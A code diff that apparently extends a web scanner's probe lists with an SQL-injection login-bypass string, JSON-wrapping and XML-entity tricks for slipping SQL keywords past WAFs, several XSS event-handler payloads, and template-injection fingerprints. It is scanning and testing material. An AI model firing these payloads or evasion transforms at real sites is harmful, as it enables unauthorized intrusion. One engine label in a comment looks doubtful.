@@ -10,6 +10,8 @@
 const ERROR_PROBES = [
   "'", '"', "')", '")', "'))",
   "' OR '1'='1", '" OR "1"="1', "' OR 1=1-- -",
+  // community 2026-09: auth-bypass tautology w/ row cap (HackerDNA lab writeup)
+  "' OR 1=1 limit 1-- ",
 ];
 
 const BOOLEAN_PAIRS = [
@@ -74,13 +76,23 @@ const TRANSFORMS = {
     for (const [kw, split] of pairs) out = out.replace(new RegExp(`\\b${kw}\\b`, "gi"), split);
     return out;
   },
+  // community 2026-09: Claroty/Noam Moshe JSON-syntax WAF blind — WAFs that
+  // can't parse JSON fail open on JSON-wrapped SQLi. Cheap to test, harmless.
+  jsonwrap: (p) => `{"a":"${p}"}`,
+  // community 2026-09: XML hex-entity keyword encoding (PortSwigger lab
+  // writeups) — hides SQL keywords from pattern-matching filters.
+  xmlentities: (p) => {
+    const hex = (s) => [...s].map((c) => `&#x${c.charCodeAt(0).toString(16)};`).join("");
+    return p.replace(/\b(UNION|SELECT|AND|OR|FROM|WHERE|SLEEP)\b/gi, (m) => hex(m));
+  },
 };
 
 const LEVEL_TRANSFORMS = {
   1: [],
   2: ["randomcase", "space2comment", "tabspace", "charencode"],
   3: ["randomcase", "space2comment", "tabspace", "newlinespace", "charencode",
-      "doubleencode", "versioned-comments", "nullbyte", "keyword-split"],
+      "doubleencode", "versioned-comments", "nullbyte", "keyword-split",
+      "jsonwrap", "xmlentities"],
 };
 
 /* encodeURIComponent that preserves intentional %XX sequences from transforms */
@@ -116,9 +128,15 @@ const XSS_PROBES = [
   { name: "evade-tab", t: "<svg\tonload={C}>", kinds: ["tag"] },
   { name: "evade-entity", t: "&#x3c;svg onload={C}&#x3e;", kinds: ["tag"] },
   { name: "evade-comment", t: "<!--><svg onload={C}>", kinds: ["tag"] },
+  // --- community additions 2026-09 (cheatsheet / writeup roundup) ---
+  { name: "html-marquee", t: "<marquee onstart={C}>", kinds: ["tag"] },
+  { name: "html-video-err", t: "<video src=x onerror={C}>", kinds: ["tag"] },
+  { name: "html-audio", t: "<audio src=x onerror={C}>", kinds: ["tag"] },
+  { name: "html-input-focus", t: "<input onfocus={C} autofocus>", kinds: ["tag"] },
+  { name: "html-math-nest", t: "<math><mtext><table><mglyph><style><img src=x onerror={C}>", kinds: ["tag"] },
 ];
 
-const XSS_LEVEL_CUTOFF = { 1: 16, 2: 20, 3: 22 };
+const XSS_LEVEL_CUTOFF = { 1: 16, 2: 20, 3: 27 };
 
 /* ------------------------------------------------------------------ */
 /* SSTI — distinctive-math probes (detection only)                     */
@@ -126,9 +144,15 @@ const XSS_LEVEL_CUTOFF = { 1: 16, 2: 20, 3: 22 };
 
 const SSTI_FACTOR_A = 1337, SSTI_FACTOR_B = 7331;
 const SSTI_EXPECTED = String(SSTI_FACTOR_A * SSTI_FACTOR_B); // 9801547
+const SSTI_EXPECTED_ALT = "7777777"; // {{7*'7'}} — Jinja2 string repeat (not Twig)
 const SSTI_PROBES = [
   `{{${SSTI_FACTOR_A}*${SSTI_FACTOR_B}}}`,
   `\${${SSTI_FACTOR_A}*${SSTI_FACTOR_B}}`,
+  // community 2026-09: more engine fingerprints
+  `<%=${SSTI_FACTOR_A}*${SSTI_FACTOR_B}%>`, // ERB / EJS
+  `#{${SSTI_FACTOR_A}*${SSTI_FACTOR_B}}`,   // Mako / Pebble
+  `*{${SSTI_FACTOR_A}*${SSTI_FACTOR_B}}`,   // Thymeleaf
+  `{{7*'7'}}`,                              // Jinja2-vs-Twig distinguisher
 ];
 
 /* ------------------------------------------------------------------ */
